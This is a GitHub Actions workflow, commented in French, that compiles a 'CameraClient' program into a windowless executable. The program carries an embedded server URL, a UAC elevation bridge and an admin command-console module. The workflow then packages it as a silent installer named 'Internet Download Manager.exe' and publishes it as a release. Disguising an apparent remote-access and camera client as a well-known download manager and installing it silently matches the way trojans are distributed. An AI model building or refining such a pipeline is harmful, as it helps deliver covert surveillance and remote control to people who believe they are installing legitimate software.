name: Build Windows client installer

on:
  push:
    branches: [main]
    paths:
      - "client.py"
      - "console_windows.py"
      - "console_admin_windows.py"
      - "admin_bridge.py"
      - "requirements.txt"
      - "embedded_config.py"
      - "packaging/windows/**"
      - "packaging/icons/**"
  workflow_dispatch:

permissions:
  contents: write # nécessaire pour publier la GitHub Release

concurrency:
  group: build-windows-client-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Récupérer le code
        uses: actions/checkout@v4

      - name: Vérifier embedded_config.py (URL du serveur intégrée au client)
        shell: cmd
        run: |
          if not exist embedded_config.py (
            echo ERREUR : embedded_config.py est introuvable dans le depot.
            exit /b 1
          )
          type embedded_config.py

      - name: Vérifier la présence des icônes
        shell: cmd
        run: |
          if not exist packaging\icons\camera_client.ico (
            echo ERREUR : packaging\icons\camera_client.ico est introuvable.
            exit /b 1
          )
          echo Icone du client trouvee :
          dir packaging\icons\camera_client.ico

      - name: Vérifier la présence de admin_bridge.py (pont UAC)
        shell: cmd
        run: |
          if not exist admin_bridge.py (
            echo ERREUR : admin_bridge.py est introuvable ^(requis pour CMD Admin^).
            exit /b 1
          )
          echo Pont UAC trouve :
          dir admin_bridge.py

      - name: Vérifier la présence de console_admin_windows.py (module CMD Admin)
        shell: cmd
        run: |
          if not exist console_admin_windows.py (
            echo ERREUR : console_admin_windows.py est introuvable ^(requis pour CMD Admin^).
            exit /b 1
          )
          echo Module CMD Admin trouve :
          dir console_admin_windows.py

      - name: Installer Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Installer les dépendances + PyInstaller
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pyinstaller

      # IMPORTANT (double piège PyInstaller avec --specpath) :
      #   * --icon ET --add-data sont résolus RELATIVEMENT AU .SPEC,
      #     c'est-à-dire dans build\ (à cause de --specpath build), PAS
      #     au répertoire courant. Un chemin relatif "admin_bridge.py"
      #     devient donc "build\admin_bridge.py" -> introuvable.
      #   * On passe donc des chemins ABSOLUS via ${{ github.workspace }}
      #     pour --icon ET pour --add-data.
      #
      # --add-data "admin_bridge.py;." : admin_bridge.py est lancé en
      # sous-processus par console_admin_windows.py, donc PAS importé par
      # client.py. PyInstaller ne le détecte pas tout seul : on l'embarque
      # explicitement pour qu'il soit extrait dans sys._MEIPASS au runtime.
      - name: Construire CameraClient.exe (sans fenêtre)
        shell: cmd
        run: >
          pyinstaller --noconfirm --clean --onefile --noconsole --name CameraClient
          --add-data "${{ github.workspace }}\admin_bridge.py;."
          --icon "${{ github.workspace }}\packaging\icons\camera_client.ico"
          --specpath build --workpath build\work-client-gui --distpath dist client.py

      - name: Construire CameraClient-console.exe (diagnostic)
        shell: cmd
        run: >
          pyinstaller --noconfirm --clean --onefile --console --name CameraClient-console
          --add-data "${{ github.workspace }}\admin_bridge.py;."
          --icon "${{ github.workspace }}\packaging\icons\camera_client.ico"
          --specpath build --workpath build\work-client-console --distpath dist client.py

      - name: Test de fumée (le client démarre sans planter)
        shell: cmd
        run: |
          rem Lance le client en mode --once : suffisant pour detecter une erreur
          rem d'import (console_windows.py absent, console_admin_windows.py
          rem manquant, ctypes mal utilise...).
          rem Sans serveur joignable, le client logue un avertissement et termine
          rem proprement (errorlevel 0 attendu).
          dist\CameraClient-console.exe --once --debug
          if errorlevel 1 (
            echo ERREUR : le client s'est termine en erreur.
            exit /b 1
          )

      - name: Installer Inno Setup
        run: choco install innosetup -y --no-progress

      - name: Préparer le dossier releases\
        shell: cmd
        run: if not exist releases mkdir releases

      - name: Diagnostic avant compilation (fichiers attendus par installer.iss)
        shell: cmd
        run: |
          echo == Repertoire de travail ==
          cd
          echo == Contenu de dist\ (attendu par [Files] Source) ==
          dir dist
          echo == Contenu de packaging\windows\ (doit contenir installer.iss) ==
          dir packaging\windows
          echo == Contenu de packaging\icons\ (doit contenir camera_client.ico) ==
          dir packaging\icons
          echo == Contenu de releases\ (attendu par OutputDir) ==
          dir releases

      - name: Construire l'installateur silencieux (Internet Download Manager.exe)
        shell: cmd
        run: |
          cd packaging\windows
          "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss

      - name: Vérifier que l'installateur a bien été créé
        shell: cmd
        run: |
          if not exist "releases\Internet Download Manager.exe" (
            echo ERREUR : releases\Internet Download Manager.exe n'a pas ete cree.
            exit /b 1
          )
          dir releases

      - name: Mettre l'installateur à disposition du workflow (résultat immédiat)
        uses: actions/upload-artifact@v4
        with:
          name: Internet-Download-Manager-Setup
          path: "releases/Internet Download Manager.exe"

      - name: Publier l'installateur comme GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: client-latest
          name: CameraClient (dernière build)
          body: "Installateur généré automatiquement — build du ${{ github.sha }}"
          files: "releases/Internet Download Manager.exe"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}